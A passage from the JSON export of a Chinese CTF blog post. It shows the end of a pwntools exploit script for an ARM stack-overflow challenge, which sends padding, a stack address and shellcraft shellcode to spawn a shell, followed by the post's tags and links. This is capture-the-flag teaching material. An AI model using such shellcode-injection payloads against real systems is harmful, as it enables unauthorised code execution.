class=\"built_in\">hex</span>(stack)</span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;arm&#x27;</span>)</span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> + p32(stack + <span class=\"number\">0x4</span> * <span class=\"number\">3</span>) + asm(shellcraft.sh())</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"by-Csome\"><a href=\"#by-Csome\" class=\"headerlink\" title=\"by Csome\"></a>by Csome</h1><p>!!!暨南大学xp0int杯wp收集截止前禁止发送给暨南大学的同学，产生的后果由转发者承担!!!</p>\n","path":"/p/xp0intCTF-wp/","permalink":"https://blog.csome.cc/p/xp0intCTF-wp/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"wp","_id":"cuidJqNHbJi05wnKf22uh4qQN","slug":"wp","path":"tags/wp/","permalink":"https://blog.csome.cc/tags/wp/","length":1}],"categories":[],"prev":{"title":"微调Hexo主题Anatolo接入gitalk","date":"2021-12-14T00:58:54.000Z","slug":"Anatolo-pug-gitalk","published":true,"updated":"2025-10-28T08:00:40.753Z","_id":"cuidyoHwEDnsDf60ia1cCSiPR","layout":"post","photos":[],"excerpt":"","path":"/p/Anatolo-pug-gitalk/","permalink":"https://blog.csome.cc/p/Anatolo-pug-gitalk/","__post":true},"next":{"title":"Pwn从0到0.00001","date":"2021-12-13T07:47:18.000Z","slug":"Pwn-zero2something","published":true,"updated":"2025-10-28T08:00:40.755Z","_id":"cuidF1mgTOR9I2dr8KArUVyhW","layout":"post","photos":[],"excerpt":"","path":"/p/Pwn-zero2something/","permalink":"https://blog.csome.cc/p/Pwn-zero2something/","__post":true},"__post":true}